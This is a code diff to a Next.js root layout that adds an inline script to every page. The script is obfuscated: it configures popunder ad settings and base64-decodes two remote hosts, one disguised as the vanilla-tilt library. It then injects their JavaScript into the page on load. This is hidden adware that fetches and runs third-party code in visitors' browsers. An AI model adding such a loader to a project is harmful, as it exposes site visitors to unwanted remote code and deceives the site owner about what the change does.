@@ -1,5 +1,7 @@
 import type { Metadata, Viewport } from "next";
 import { Inter } from "next/font/google";
+import Script from 'next/script';
+
 import "./globals.css";
 import Navbar from "@/components/Navbar";
 import { ThemeProvider } from "@/providers/theme";
@@ -75,6 +77,19 @@ export default function RootLayout({
   //   .catch(console.error);
   return (
     <html lang="en">
+      <Script
+        strategy="afterInteractive"
+        onLoad={() => {
+          console.log('Script loaded!');
+        }}
+        onError={(error) => {
+          console.error('Error loading script:', error);
+        }}
+      >
+        {`
+          (function(){var u=window,y="c7096acef8d9efc61dbaf11ee5268f20",h=[["siteId", 511+667-138+772+5048171], ["minBid", 0], ["popundersPerIP", "0"], ["delayBetween", 0], ["default", false], ["defaultPerDay", 0], ["topmostLayer", !0]]; if (u[y]) return; try{u["_pop"]=h;Object.freeze(u["_pop"]);}catch(e){}; try{u[y]=h;Object.freeze(u[y]);}catch(e){}; var r=[atob("d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL2FwaS9qcy92aXNpYmlsaXR5Lm1pbi5qcw=="),atob("ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvdmFuaWxsYS10aWx0Lm1pbi5qcw==")],w=0,g,q=function(){if((!r[w])||(((new Date()).getTime()>1727605111000)&&(w>1)))return;g=u["document"]["createElement"]("script"); g["type"]="text/javascript"; g["async"]=!0;var a=u["document"]["getElementsByTagName"]("script")[0]; g["src"]='https://'+r[w]; g["crossOrigin"]="anonymous"; g["onerror"]=function(){w++;q()}; a["parentNode"]["insertBefore"](g,a)}; q()})();
+        `}
+      </Script>
       <body className={"flex flex-col min-h-screen " + inter.className}>
         <ThemeProvider
           attribute="class"
